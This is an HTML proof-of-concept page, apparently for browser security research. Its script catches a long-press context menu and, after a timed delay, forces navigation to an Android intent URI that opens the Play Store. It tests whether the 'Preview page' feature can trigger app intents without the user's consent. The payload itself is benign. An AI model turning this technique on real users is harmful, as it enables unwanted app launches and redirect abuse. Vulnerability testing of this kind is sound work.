<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Play Store Intent PoC</title>
  <style>
    :root {
      --bg: #0f172a;
      --card: #1e293b;
      --accent: #10b981;
      --accent-hover: #059669;
      --text: #f8fafc;
      --text-muted: #94a3b8;
    }

    body {
      font-family: system-ui, -apple-system, sans-serif;
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      margin: 0;
      display: grid;
      place-content: center;
      text-align: center;
      padding: 20px;
    }

    .wrapper {
      background: var(--card);
      padding: 35px 28px;
      border-radius: 16px;
      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
      max-width: 380px;
      width: 100%;
      border: 1px solid rgba(255, 255, 255, 0.05);
    }

    h2 {
      margin-top: 0;
      font-size: 1.3rem;
    }

    p {
      color: var(--text-muted);
      font-size: 0.9rem;
      line-height: 1.4;
      margin-bottom: 24px;
    }

    .target-btn {
      display: block;
      width: 100%;
      box-sizing: border-box;
      padding: 16px;
      background: var(--accent);
      color: white;
      text-decoration: none;
      font-weight: 600;
      font-size: 0.95rem;
      border-radius: 10px;
      transition: background 0.2s, transform 0.1s;
    }

    .target-btn:active {
      background: var(--accent-hover);
      transform: scale(0.98);
    }

    .hud {
      margin-top: 20px;
      padding: 10px;
      background: rgba(15, 23, 42, 0.6);
      border-radius: 8px;
      font-family: monospace;
      font-size: 0.75rem;
      color: #34d399;
      border: 1px solid rgba(52, 211, 153, 0.1);
    }
  </style>
</head>
<body>

  <div class="wrapper">
    <h2>Play Store Intent PoC</h2>
    <p>Long-press target, select <b>Preview page</b>, and observe if Play Store triggers.</p>
    
    <a href="https://play.google.com" id="pocLink" class="target-btn">
      Trigger Play Store Intent
    </a>

    <div class="hud" id="hudStatus">HUD: IDLE - Waiting for long-press</div>
  </div>

  <script>
    const link = document.getElementById("pocLink");
    const hud = document.getElementById("hudStatus");
    let state = 0;

    // Intent URI yang menargetkan Google Play Store (contoh: membuka halaman aplikasi WhatsApp atau aplikasi populer lain)
    const playStoreIntent = "intent://details?id=com.whatsapp#Intent;scheme=market;package=com.android.vending;S.browser_fallback_url=https%3A%2F%2Fplay.google.com%2Fstore%2Fapps%2Fdetails%3Fid%3Dcom.whatsapp;end;";

    link.addEventListener("pointerdown", () => {
      if (state === 0) {
        state = 1;
        hud.textContent = "HUD: Pointer down detected...";
      }
    }, { passive: true });

    link.addEventListener("contextmenu", (e) => {
      if (state === 2) return;
      state = 2;
      
      hud.textContent = "HUD: Context menu captured. T-2500ms...";

      setTimeout(() => {
        hud.textContent = "HUD: Injecting Play Store Intent...";
        
        // Memaksa navigasi ke skema market/playstore dari background
        window.location.href = playStoreIntent;

        setTimeout(() => {
          state = 0;
          hud.textContent = "HUD: State reset. Ready again.";
        }, 1200);

      }, 2500);
    });
  </script>

</body>
</html>
